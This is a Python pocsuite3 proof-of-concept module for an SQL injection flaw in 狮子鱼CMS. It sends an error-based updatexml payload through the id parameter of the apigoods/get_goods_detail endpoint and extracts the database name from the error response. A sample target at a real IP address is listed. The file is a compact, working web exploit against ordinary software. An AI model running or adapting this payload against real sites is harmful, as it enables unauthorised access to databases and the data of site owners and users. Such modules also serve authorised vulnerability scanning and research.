from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE, OptString, REVERSE_PAYLOAD 
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import json
import urllib
import re


class DemoPOC(POCBase):
    vulID = '97207'  # ssvid
    version = '1.0'
    author = ['wuerror']
    vulDate = '2021-06-20'
    createDate = '2021-06-20'
    updateDate = '2021-06-20'
    references = ['https://github.com/PeiQi0/PeiQi-WIKI-POC']
    name = '狮子鱼CMS_sqlinject'
    appPowerLink = ''
    appName = '狮子鱼CMS'
    appVersion = ''
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞'''
    samples = ["https://139.155.37.86/"]
    install_requires = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    
    def _verify(self):
        result = {}
        payload = r"index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,(database()),0x7e),1)"
        url = self.url + payload
        r = requests.get(url, verify=False)
        if "XPATH syntax error" in r.text:
            regx = re.findall(r'XPATH syntax error: .*?\r\n', r.text)
            dbname = re.findall(r'~.*?~', regx[0])[0]
            result['VerifyInfo'] = {}
            result['Database'] = {}
            result['Database']['DBname'] = dbname.strip('~')
            result['VerifyInfo']['URL'] = url
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)
